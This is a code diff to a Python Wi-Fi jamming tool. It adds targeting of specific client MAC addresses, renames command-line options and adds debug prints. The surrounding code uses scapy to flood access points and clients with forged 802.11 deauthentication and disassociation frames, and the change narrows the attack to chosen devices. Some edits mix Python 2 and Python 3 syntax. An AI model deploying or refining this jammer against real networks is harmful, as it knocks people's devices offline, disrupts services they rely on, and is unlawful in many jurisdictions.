@@ -61,7 +61,8 @@ class wifijammer:
         self.mChannels  = args["channel"]
         self.mKill      = args["kill"]
         self.mDirected  = args["directed"]
-        self.mTargets   = [x for x in args['targets'] if re.match("[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", x.lower())]
+        self.mapTarget   = [x for x in args['apTarget'] if re.match("[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", x.lower())]
+        self.cTarget   = [x for x in args['clientTarget'] if re.match("[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", x.lower())]
         self.mMaximum   = int(args["maximum"])
         self.mPackets   = int(args["pkts"])
         self.mTimeout   = float(args["timeout"])
@@ -95,7 +96,8 @@ class wifijammer:
                 self.mChannels = list(range(1, 12)) + five_hertz
 
         if pyw.modeget(self.mInterface) != 'monitor':
-            logging.debug('Enabling monitor mode on interface '+self.mInterface)
+            logging.debug('DISABLED Enabling monitor mode on interface '+self.mInterface)
+            
             start_mon_mode(self.mInterface)
 
         if self.mKill:
@@ -106,6 +108,7 @@ class wifijammer:
         return
 
     def jam(self):
+        print(self.cTarget)
         self.hop = Thread(target=self.channel_hop)
         self.hop.daemon = True
         self.hop.start()
@@ -114,19 +117,22 @@ class wifijammer:
 
         filter_string = ""
 
-        if len(self.mTargets) > 1:
-            filter_string = "ether host "+self.mTargets[0]
-            for client in self.mTargets[1:]:
+        if len(self.mapTarget) > 1:
+            filter_string = "ether host "+self.mapTarget[0]
+            for client in self.mapTarget[1:]:
                 filter_string += " or ether host " + client
 
-        elif len(self.mTargets) == 1:
-            filter_string = "ether host " + self.mTargets[0].lower()
+        elif len(self.mapTarget) == 1:
+            filter_string = "ether host " + self.mapTarget[0].lower()
 
-        # try:
-        sniff(iface=self.mInterface, filter=filter_string, store=0, prn=self.cb)
-        # except Exception as msg:
-        #     print(msg)
-        #     stop()
+        try:
+            sniff(iface=self.mInterface, filter=filter_string, store=0, prn=self.cb)
+        except Exception as msg:
+            print(msg)
+
+
+
+
 
     def channel_hop(self):
         interface = pyw.getcard(self.mInterface)
@@ -154,8 +160,10 @@ class wifijammer:
 
                 try:
                     pyw.chset(interface, int(self.mChannel), None)
-                except:
-                    sys.stderr.write("Channel Hopping Failed")
+                except Exception,e:
+                    print str(e)
+                    sys.stderr.write("Channel Hopping Failed!")
+
 
             self.output()
 
@@ -170,9 +178,6 @@ class wifijammer:
             self.deauth()
 
     def output(self):
-        if self.mLoglevel != 'debug':
-            os.system('clear')
-
         print(
             "[{0}+{1}] {2} channel {0}{3}{1}".format(
                 G,
@@ -209,8 +214,6 @@ class wifijammer:
                                 str(ca[2]).ljust(4)
                             )
                         )
-
-
         with threadLock:
             print('\n      Access Points     ch     ESSID')
             for ap in self.APs:
@@ -237,8 +240,9 @@ class wifijammer:
                     client = x[0]
                     ap = x[1]
                     ch = x[2]
-                    # print(str(ch)+":"+str(self.mChannel))
+                    #print(str(ch)+":"+str(self.mChannel))
                     if int(ch) == int(self.mChannel):
+                        #print("Deauthing client {0} who is connected to AP {1} on channel {2}".format(client, ap, ch))
                         deauth_pkt1 = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
                         deauth_pkt2 = Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
                         disas_pkt1 = Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Disas()
@@ -262,7 +266,6 @@ class wifijammer:
 
         if len(pkts) > 0:
             for p in pkts:
-                # print("Deauth")
                 send(p, inter=float(self.mTimeout), count=self.mPackets)
 
     def noise_filter(self, addr1, addr2):
@@ -333,6 +336,8 @@ class wifijammer:
             return self.APs.append([bssid, ap_channel, ssid])
 
     def clients_add(self, addr1, addr2):
+        if not (addr1 in self.cTarget or addr2 in self.cTarget):
+            return
         if len(self.clients) == 0:
             if len(self.APs) == 0:
                 with threadLock:
@@ -404,7 +409,7 @@ def parse_args():
         dest="maximum",
         help="Maximum length of client list before it is reset")
 
-    parser.add_argument("-t", "--timeinterval",
+    parser.add_argument("-l", "--timeinterval",
         dest="timeout",
         default=0.001,
         help="Time between deauth pkts")
@@ -423,8 +428,14 @@ def parse_args():
     parser.add_argument("-a", "--accesspoint",
         nargs='*',
         default=[],
-        dest="targets",
+        dest="apTarget",
         help="Enter the SSID or MAC address of a specific access point[s] to target")
+
+    parser.add_argument("-t", "--targetclients",
+        nargs='*',
+        default=[],
+        dest="clientTarget",
+        help="Enter the MAC address of a specific client[s] to target")
 
     parser.add_argument("-s", "--skip",
         nargs='*',
@@ -438,7 +449,7 @@ def parse_args():
         action='store_true',
         help="Detailed print out like default wifijammer")
 
-    parser.add_argument("-l", "--loglevel",
+    parser.add_argument("-g", "--loglevel",
         default='info',
         dest="loglevel",
         help="Logging level")
@@ -469,6 +480,7 @@ def start_mon_mode(interface):
         os.system('ip link set %s down' % interface)
         os.system('iwconfig %s mode monitor' % interface)
         os.system('ip link set %s up' % interface)
+        print("done with that")
         return interface
     except Exception:
         sys.exit('['+R+'-'+W+'] Could not start monitor mode')
